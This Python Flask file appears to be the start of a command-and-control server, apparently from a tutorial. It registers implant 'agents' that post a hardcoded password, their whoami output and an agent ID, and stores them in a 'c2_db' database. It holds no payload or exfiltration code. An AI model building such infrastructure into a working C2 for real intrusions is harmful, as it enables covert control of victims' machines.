from flask import Flask , request, jsonify
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__) # use this to generate routes and handlers

# some useful notes here #
"""
sqlite:///:memory: (in-memory database)
sqlite:///relative_path/test.db (relatie path file-based database)
sqlite:////absolute_path/test.db (abs path file-based database)
"""

# set the database to work with flask
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2_db.sqlite'
db = SQLAlchemy(app)


password = "ch0nky" # a temperary password to test the server

def verify_password(reg_password):
    """
        a function that verifies the password
        TODO: need a safer way to verify the password in the actual implementation
    """
    return reg_password == password

# the following is a route
# think of this as a subpage
# e.g. 127.0.0.1/register_agent
@app.route('/register_agent', methods=["POST"]) # support only POST requests
def register_agent(): # --> this is a handler
    """
        listens to the /register_agent route
        and processes the registration request from agents
    """
    # request.json -> this will be how we are getting data from implant

    reg_data = request.json # storing registration data
    reg_password = reg_data["password"]
    reg_whoami = reg_data["whoami"]
    reg_agent_id = reg_data["agent_id"]

    if verify_password(reg_password):
        print("[+] a new agent has successfully registered")
        print(f"[+] agent_id: {reg_agent_id}")
        return jsonify({"status": "ok"})
    else:
        # print("[-] authentication failed")
        return jsonify({"status": "authentication failed"})
    return "[-] something went wrong"

if __name__ == '__main__':
    app.run()